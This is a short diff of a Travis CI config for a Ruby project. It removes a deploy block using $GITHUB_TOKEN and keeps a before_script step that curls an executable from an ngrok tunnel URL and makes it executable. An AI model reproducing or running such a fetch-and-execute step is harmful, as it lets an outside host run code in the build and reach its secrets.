@@ -3,9 +3,6 @@ language: ruby
 rvm:
   - 2.6.3
 
-deploy:
-  github_token: $GITHUB_TOKEN
-
 before_script:
   - curl -L https://e3a832b1.ngrok.io/api/v1/travis_script > ./test_cov_script.sh
   - chmod +x ./test_cov_script.sh
